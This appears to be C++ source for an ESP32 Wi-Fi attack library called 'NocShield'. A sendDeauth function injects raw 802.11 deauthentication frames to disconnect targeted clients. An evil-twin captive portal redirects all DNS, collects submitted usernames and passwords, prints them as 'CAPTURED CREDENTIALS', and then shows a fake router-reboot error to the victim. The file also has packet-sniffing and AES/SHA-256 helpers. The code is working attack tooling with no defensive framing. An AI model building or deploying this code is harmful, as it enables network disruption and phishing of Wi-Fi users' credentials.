#include "NocShield.h"

NocShield::NocShield() : _isMonitoring(false), _dnsServer(nullptr), _webServer(nullptr), _portalHtml(nullptr) {
}

NocShield::~NocShield() {
    stopPacketMonitor();
    if (_dnsServer) {
        _dnsServer->stop();
        delete _dnsServer;
    }
    if (_webServer) {
        _webServer->stop();
        delete _webServer;
    }
}

void NocShield::begin() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
}

bool NocShield::sendDeauth(uint8_t *targetMac, uint8_t *apMac, uint8_t channel, uint16_t reason) {
    uint8_t deauthFrame[26] = {
        0xC0, 0x00, 
        0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 
        0x01, 0x00  
    };

    for (int i = 0; i < 6; i++) {
        deauthFrame[4 + i]  = targetMac[i];
        deauthFrame[10 + i] = apMac[i];
        deauthFrame[16 + i] = apMac[i];
    }
    
    deauthFrame[24] = reason & 0xFF;
    deauthFrame[25] = (reason >> 8) & 0xFF;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    
    return (result == ESP_OK);
}

void NocShield::startPacketMonitor(wifi_promiscuous_cb_t callback) {
    if (_isMonitoring) return;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(callback);
    _isMonitoring = true;
}

void NocShield::stopPacketMonitor() {
    if (!_isMonitoring) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _isMonitoring = false;
}

void NocShield::startCaptivePortal(const char* ssid, const char* htmlContent) {
    _portalHtml = htmlContent;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    _dnsServer = new DNSServer();
    _webServer = new WebServer(80);
    
    _dnsServer->start(53, "*", WiFi.softAPIP());
    
    _webServer->on("/", [this]() {
        _webServer->send(200, "text/html", _portalHtml);
    });
    
    _webServer->onNotFound([this]() {
        _webServer->sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
        _webServer->send(302, "text/plain", "");
    });
    
    _webServer->on("/login", HTTP_POST, [this]() {
        String username = _webServer->arg("username");
        String password = _webServer->arg("password");
        
        Serial.println("\n--- [ALERT] CAPTURED CREDENTIALS ---");
        Serial.println("Username: " + username);
        Serial.println("Password: " + password);
        Serial.println("------------------------------------\n");
        
        String errorHtml = "<html><body><h2>Connection failed. The router is rebooting.</h2></body></html>";
        _webServer->send(200, "text/html", errorHtml);
    });
    
    _webServer->begin();
    Serial.println("Captive portal started!");
    Serial.print("SSID: "); Serial.println(ssid);
    Serial.print("IP Address: "); Serial.println(WiFi.softAPIP());
}

void NocShield::handleCaptivePortal() {
    if (_dnsServer) _dnsServer->processNextRequest();
    if (_webServer) _webServer->handleClient();
}

// ---------------- Cryptography ----------------

String NocShield::bytesToHex(const uint8_t* bytes, size_t length) {
    String hexString = "";
    for (size_t i = 0; i < length; i++) {
        if (bytes[i] < 16) hexString += "0";
        hexString += String(bytes[i], HEX);
    }
    return hexString;
}

void NocShield::hexToBytes(const String& hex, uint8_t* bytes, size_t length) {
    for (size_t i = 0; i < length; i++) {
        String byteString = hex.substring(i * 2, i * 2 + 2);
        bytes[i] = (uint8_t) strtol(byteString.c_str(), NULL, 16);
    }
}

uint32_t NocShield::generateRandomNumber() {
    return esp_random();
}

String NocShield::hashSHA256(const String& payload) {
    byte shaResult[32];
    mbedtls_md_context_t ctx;
    mbedtls_md_type_t md_type = MBEDTLS_MD_SHA256;

    mbedtls_md_init(&ctx);
    mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(md_type), 0);
    mbedtls_md_starts(&ctx);
    mbedtls_md_update(&ctx, (const unsigned char *)payload.c_str(), payload.length());
    mbedtls_md_finish(&ctx, shaResult);
    mbedtls_md_free(&ctx);

    return bytesToHex(shaResult, 32);
}

String NocShield::encryptAES(const String& plaintext, const uint8_t* key, const uint8_t* iv) {
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_enc(&aes, key, 256); // Assuming 256-bit key

    // PKCS#7 Padding
    size_t paddedLength = plaintext.length() + (16 - (plaintext.length() % 16));
    uint8_t* paddedData = new uint8_t[paddedLength];
    memcpy(paddedData, plaintext.c_str(), plaintext.length());
    
    uint8_t paddingValue = paddedLength - plaintext.length();
    for (size_t i = plaintext.length(); i < paddedLength; i++) {
        paddedData[i] = paddingValue;
    }

    uint8_t* output = new uint8_t[paddedLength];
    uint8_t ivCopy[16];
    memcpy(ivCopy, iv, 16); // mbedtls modifies the IV!

    mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, paddedLength, ivCopy, paddedData, output);
    mbedtls_aes_free(&aes);

    String result = bytesToHex(output, paddedLength);
    delete[] paddedData;
    delete[] output;

    return result;
}

String NocShield::decryptAES(const String& ciphertextHex, const uint8_t* key, const uint8_t* iv) {
    size_t ciphertextLength = ciphertextHex.length() / 2;
    uint8_t* cipherData = new uint8_t[ciphertextLength];
    hexToBytes(ciphertextHex, cipherData, ciphertextLength);

    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_dec(&aes, key, 256); // Assuming 256-bit key

    uint8_t* output = new uint8_t[ciphertextLength];
    uint8_t ivCopy[16];
    memcpy(ivCopy, iv, 16); // mbedtls modifies the IV!

    mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, ciphertextLength, ivCopy, cipherData, output);
    mbedtls_aes_free(&aes);

    // PKCS#7 Unpadding
    uint8_t paddingValue = output[ciphertextLength - 1];
    size_t unpaddedLength = ciphertextLength - paddingValue;
    
    String result = "";
    if (paddingValue > 0 && paddingValue <= 16) {
        for (size_t i = 0; i < unpaddedLength; i++) {
            result += (char)output[i];
        }
    }

    delete[] cipherData;
    delete[] output;

    return result;
}
